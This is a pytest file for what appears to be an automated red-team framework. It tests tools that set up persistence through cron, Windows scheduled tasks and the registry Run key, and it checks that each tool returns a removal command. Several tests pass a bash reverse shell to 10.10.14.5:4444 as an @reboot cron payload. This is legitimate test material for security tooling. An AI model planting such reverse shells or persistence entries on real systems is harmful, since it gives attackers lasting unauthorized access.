"""Tests for the persistence tool wrappers (Phase 4, Task 6).

Five persistence methods live in ``autored/tools.persistence`` — three of
them (``cron_modify``, ``schtasks_create``, ``reg_modify``) have full
``@tool`` wrappers and the other two (``systemd_create``,
``ssh_key_add``) are exposed only as ``_build_*`` / ``_removal_*``
helpers per the Phase 4 plan analysis (their execution surface is the
foothold shell, not the operator — Phase 6 will wire them into the
FootholdSessionManager when the session manager exists).

Per the brief and the watch-out list, every ``@tool`` wrapper MUST
return a ``PersistenceResult`` whose ``artifact`` is a non-null
``PersistenceArtifact`` with a non-empty ``removal_command`` — that is
the contract the Phase 5 Cleanup Agent walks. The six brief-mandated
tests cover the ``_build_*`` and ``_removal_*`` helpers; three
integration tests cover the decorator-stacking regression catcher
(Ruling 1) for each ``@tool`` wrapper.
"""
from __future__ import annotations

import pytest

from autored.config import load_roe
from autored.roe_guard import register_roe
from autored.tools.persistence import (
    PersistenceResult,
    _build_cron_modify,
    _build_reg_modify,
    _build_schtasks_create,
    _removal_cron,
    _removal_reg,
    _removal_schtasks,
    cron_modify,
    reg_modify,
    schtasks_create,
)


def test_build_cron_modify():
    """``_build_cron_modify`` returns (cmd, removal) — the cmd is a sh -c
    one-liner that appends the entry to the user's crontab, and the removal
    is the inverse grep-v pipeline.

    The brief wrote the assertions as ``"crontab" in cmd``, but ``cmd`` is a
    list (``["sh", "-c", "(crontab -l; echo '...') | crontab -"]``) — Python's
    ``in`` on a list checks element membership, not substring membership,
    and ``"crontab"`` is not a top-level element. We join the list first
    (matching the pattern in the T7 ``test_build_exfil_https`` brief) so the
    substring assertions actually exercise the cmd content.
    """
    cmd, removal = _build_cron_modify(
        "@reboot", "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"
    )
    cmd_str = " ".join(cmd)
    assert "crontab" in cmd_str
    assert "@reboot" in cmd_str
    assert "crontab" in removal  # removal command


def test_build_schtasks_create():
    """``_build_schtasks_create`` returns (cmd, removal) — the cmd is a
    schtasks /create argv list, and the removal is schtasks /delete."""
    cmd, removal = _build_schtasks_create(
        "AutoRedPersist", "powershell -enc abc123", "ONLOGON"
    )
    assert "schtasks" in cmd
    assert "/create" in cmd
    assert "AutoRedPersist" in cmd
    assert "schtasks" in removal
    assert "/delete" in removal


def test_build_reg_modify():
    """``_build_reg_modify`` returns (cmd, removal) — the cmd is a reg add
    argv list, and the removal is reg delete."""
    cmd, removal = _build_reg_modify(
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "AutoRed",
        "powershell -enc abc123",
    )
    assert "reg" in cmd
    assert "add" in cmd
    assert "reg" in removal
    assert "delete" in removal


def test_removal_cron_nonempty():
    """Review Focus: every persistence method must produce a removal command."""
    assert _removal_cron("bash -i >& /dev/tcp/10.10.14.5/4444 0>&1")
    assert "crontab" in _removal_cron("test")


def test_removal_schtasks_nonempty():
    assert _removal_schtasks("AutoRedPersist")
    assert "/delete" in _removal_schtasks("test")


def test_removal_reg_nonempty():
    assert _removal_reg(
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "AutoRed"
    )
    assert "delete" in _removal_reg("test", "test")


@pytest.mark.asyncio
async def test_cron_modify_ainvoke_works_with_roe_guard(
    sandbox_roe_yaml, monkeypatch
):
    """Integration test: ``@tool`` outer + ``@roe_guard`` inner per Ruling 1.

    Also verifies the Review Focus #3 contract: every persistence @tool
    must return a ``PersistenceArtifact`` with a non-empty
    ``removal_command`` so the Phase 5 Cleanup Agent can reverse the
    implant.
    """
    roe = load_roe(sandbox_roe_yaml)
    register_roe("cron-int", roe)

    async def fake_save_raw(*args, **kwargs):
        return "/tmp/fake/cron_persist_cmd.out"

    monkeypatch.setattr("autored.tools.persistence._save_raw", fake_save_raw)

    result = await cron_modify.ainvoke(
        {
            "schedule": "@reboot",
            "command": "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1",
            "host_ip": "10.10.10.5",
            "foothold_id": "fh-001",
            "engagement_id": "cron-int",
        }
    )

    assert isinstance(result, PersistenceResult)
    assert result.method == "cron"
    assert result.host_ip == "10.10.10.5"
    assert result.success is True
    # Phase 4 stub: command saved to raw_output_path; the artifact is the
    # contract the Phase 5 Cleanup Agent walks.
    assert result.raw_output_path == "/tmp/fake/cron_persist_cmd.out"
    assert result.artifact is not None
    assert result.artifact.method == "cron"
    assert result.artifact.host_ip == "10.10.10.5"
    assert result.artifact.foothold_id == "fh-001"
    # Review Focus #3: removal_command MUST be present and non-empty.
    assert result.artifact.removal_command
    assert "crontab" in result.artifact.removal_command


@pytest.mark.asyncio
async def test_schtasks_create_ainvoke_works_with_roe_guard(
    sandbox_roe_yaml, monkeypatch
):
    """Integration test for ``schtasks_create`` — same rationale as the
    ``cron_modify`` test above."""
    roe = load_roe(sandbox_roe_yaml)
    register_roe("schtasks-int", roe)

    async def fake_save_raw(*args, **kwargs):
        return "/tmp/fake/schtasks_persist_cmd.out"

    monkeypatch.setattr("autored.tools.persistence._save_raw", fake_save_raw)

    result = await schtasks_create.ainvoke(
        {
            "task_name": "AutoRedPersist",
            "command": "powershell -enc abc123",
            "trigger": "ONLOGON",
            "host_ip": "10.10.10.5",
            "foothold_id": "fh-001",
            "engagement_id": "schtasks-int",
        }
    )

    assert isinstance(result, PersistenceResult)
    assert result.method == "scheduled_task"
    assert result.host_ip == "10.10.10.5"
    assert result.success is True
    assert result.raw_output_path == "/tmp/fake/schtasks_persist_cmd.out"
    assert result.artifact is not None
    assert result.artifact.method == "scheduled_task"
    assert result.artifact.removal_command
    assert "/delete" in result.artifact.removal_command
    assert "AutoRedPersist" in result.artifact.removal_command


@pytest.mark.asyncio
async def test_reg_modify_ainvoke_works_with_roe_guard(
    sandbox_roe_yaml, monkeypatch
):
    """Integration test for ``reg_modify`` — same rationale as the
    ``cron_modify`` test above."""
    roe = load_roe(sandbox_roe_yaml)
    register_roe("reg-int", roe)

    async def fake_save_raw(*args, **kwargs):
        return "/tmp/fake/reg_persist_cmd.out"

    monkeypatch.setattr("autored.tools.persistence._save_raw", fake_save_raw)

    result = await reg_modify.ainvoke(
        {
            "key_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "value_name": "AutoRed",
            "value_data": "powershell -enc abc123",
            "host_ip": "10.10.10.5",
            "foothold_id": "fh-001",
            "engagement_id": "reg-int",
        }
    )

    assert isinstance(result, PersistenceResult)
    assert result.method == "registry_run"
    assert result.host_ip == "10.10.10.5"
    assert result.success is True
    assert result.raw_output_path == "/tmp/fake/reg_persist_cmd.out"
    assert result.artifact is not None
    assert result.artifact.method == "registry_run"
    assert result.artifact.removal_command
    assert "delete" in result.artifact.removal_command
